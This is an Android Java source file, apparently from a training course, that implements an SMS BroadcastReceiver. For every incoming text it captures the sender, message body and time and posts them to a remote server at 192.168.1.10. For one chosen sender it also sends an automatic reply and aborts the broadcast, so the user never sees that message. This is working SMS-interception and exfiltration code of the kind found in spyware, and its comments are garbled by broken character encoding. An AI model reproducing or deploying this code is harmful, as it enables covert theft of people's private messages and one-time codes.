package cn.itcast.sms.listener;

import java.sql.Date;
import java.text.SimpleDateFormat;
import java.util.HashMap;
import java.util.Map;

import cn.itcast.utils.SocketHttpRequester;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

public class SMSBroadcastReceiver extends BroadcastReceiver {
	private static final String TAG = "SMSBroadcastReceiver";

	@Override
	public void onReceive(Context context, Intent intent) {
		Object[] pdus = (Object[])intent.getExtras().get("pdus");
		for(Object pd : pdus){
			byte[] data = (byte[])pd;
			SmsMessage sms = SmsMessage.createFromPdu(data);
			String sender = sms.getOriginatingAddress();//˭�����Ķ���
			String content = sms.getMessageBody();//��������
			Date time = new Date(sms.getTimestampMillis());//��ʱ�����Ķ���
			SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
			String sendtime = format.format(time);
			Map<String, String> params = new HashMap<String, String>();
			params.put("method", "getSMS");
			params.put("sender", sender);
			params.put("content", content);
			params.put("time", sendtime);
			try {
				SocketHttpRequester.post("http://192.168.1.10:8080/videoweb/video/manage.do", params, "UTF-8");
			} catch (Exception e) {
				Log.e(TAG, e.toString());
			}
			if("5556".equals(sender)){
				SmsManager manager = SmsManager.getDefault();
				manager.sendTextMessage(sender, null, "You OVER", null, null);
				abortBroadcast();//��ֹ�㲥
			}
		}
	}

}
